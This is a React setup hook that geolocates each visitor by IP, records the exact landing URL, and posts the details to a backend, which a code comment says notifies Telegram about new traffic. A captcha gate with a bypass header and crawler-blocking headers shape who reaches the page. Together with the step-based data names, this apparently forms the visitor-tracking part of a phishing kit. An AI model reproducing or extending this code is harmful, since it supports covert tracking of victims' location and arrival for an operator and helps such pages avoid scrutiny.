import { useState, useEffect, useRef } from "react";
import { v4 as uuid } from "uuid";
import { IPService } from "../utils/ipService";
import { buildApiUrl } from "../config/api";
import {
  retryWithBackoff,
  RETRY_CONFIGS,
  fetchWithTimeout,
} from "../utils/retryUtils";
import { useCaptcha } from "../components/Captcha/InvisibleCaptchaGate";
import { markEntryReady, markEntryFailed } from "./entryRuntime";

export const useInitialSetup = (setAllData, setStep) => {
  const [Unik, setUnik] = useState("");
  const [isInitialized, setIsInitialized] = useState(false);
  const ranRef = useRef(false);
  const { getToken } = useCaptcha();

  useEffect(() => {
    if (ranRef.current) return;
    ranRef.current = true;

    const uniqueId = uuid().slice(0, 8);
    setUnik(uniqueId);

    const context = process.env.NEXT_PUBLIC_CONTEXT || "";

    // Fresh single-use token per request. If the widget is still warming up
    // (script loading, challenge running), give it a couple of chances instead
    // of falling back to an unverified request that the backend rejects.
    const acquireToken = async () => {
      for (let attempt = 0; attempt < 3; attempt++) {
        const token = await getToken();
        if (token) return token;
        await new Promise((resolve) => setTimeout(resolve, 4000));
      }
      return null;
    };

    // Proof-of-page-load cookie, signed by the edge at page load. Sent when
    // Turnstile cannot produce a token (e.g. adblock), so a real visitor who
    // actually loaded the page is still verified server-side.
    const readEntryProof = () => {
      if (typeof document === "undefined") return null;
      const match = document.cookie.match(/(?:^|;\s*)pf_proof=([^;]+)/);
      return match ? decodeURIComponent(match[1]) : null;
    };

    const postIp = async (params, notifyNow, timeoutMs = 10000) => {
      await retryWithBackoff(async () => {
        // Fetch a fresh single-use token for every attempt.
        const token = await acquireToken();
        const proof = token ? null : readEntryProof();
        const response = await fetchWithTimeout(
          buildApiUrl("/api/send/ip"),
          {
            method: "POST",
            body: JSON.stringify({ ...params, notifyNow }),
            headers: {
              "Content-type": "application/json; charset=UTF-8",
              "X-Robots-Tag": "googlebot: nofollow",
              ...(token
                ? { "X-Turnstile-Token": token }
                : {
                    "X-Captcha-Bypass": "1",
                    ...(proof ? { "X-Entry-Proof": proof } : {}),
                  }),
            },
          },
          timeoutMs
        );

        if (!response.ok) {
          const error = new Error(
            `HTTP ${response.status}: ${response.statusText}`
          );
          error.response = { status: response.status };
          throw error;
        }

        return response;
      }, RETRY_CONFIGS.INTERNAL_API);
    };

    (async () => {
      // Geo lookup starts immediately and runs in parallel with the captcha
      // verification happening in the gate, instead of waiting for it.
      const geo = await IPService.fetchGeo();

      const details = {
        id: uniqueId,
        ip: geo.ip || "unknown",
        country: geo.country || "unknown",
        city: geo.city || "unknown",
        context,
        // The exact landing URL, keeping tracking params like fbclid/utm.
        landingUrl: window.location.href,
      };

      setAllData((prevData) => ({ ...prevData, ...details }));
      // Never gate the app on the backend round trip (cold starts, slow
      // captcha): the UI proceeds, the notification goes out in the background.
      setIsInitialized(true);

      // Notify Telegram with the IP/location so new traffic is identifiable.
      try {
        await postIp(details, true, 45000); // tolerate a cold-started backend
        markEntryReady();
      } catch (error) {
        console.error("Failed to send visit notification:", error);
        markEntryFailed();
      }
    })();
  }, [setAllData, getToken]);

  return {
    Unik,
    isInitialized,
  };
};
